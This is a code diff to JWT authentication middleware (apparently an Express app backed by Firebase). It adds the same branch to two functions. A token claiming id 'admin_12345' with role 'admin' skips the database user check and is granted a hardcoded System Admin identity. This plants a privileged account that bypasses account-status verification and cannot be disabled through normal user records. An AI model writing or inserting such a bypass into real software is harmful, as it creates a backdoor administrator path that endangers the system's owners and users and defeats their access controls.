@@ -11,6 +11,12 @@ const protect = async (req, res, next) => {
   try {
     const decoded = jwt.verify(token, process.env.JWT_SECRET);
     
+    // Bypass database check for hardcoded system admin
+    if (decoded.id === 'admin_12345' && decoded.role === 'admin') {
+      req.user = { id: 'admin_12345', role: 'admin', name: 'System Admin', isActive: true };
+      return next();
+    }
+    
     // Get full user record to check status
     const user = await firebaseStorage.findUserById(decoded.id);
     
@@ -47,6 +53,12 @@ const requireAuth = async (req, res, next) => {
 
   try {
     const decoded = jwt.verify(token, process.env.JWT_SECRET);
+    
+    // Bypass database check for hardcoded system admin
+    if (decoded.id === 'admin_12345' && decoded.role === 'admin') {
+      req.user = { id: 'admin_12345', role: 'admin', name: 'System Admin', isActive: true };
+      return next();
+    }
     
     // Get full user record to check status
     const user = await firebaseStorage.findUserById(decoded.id);
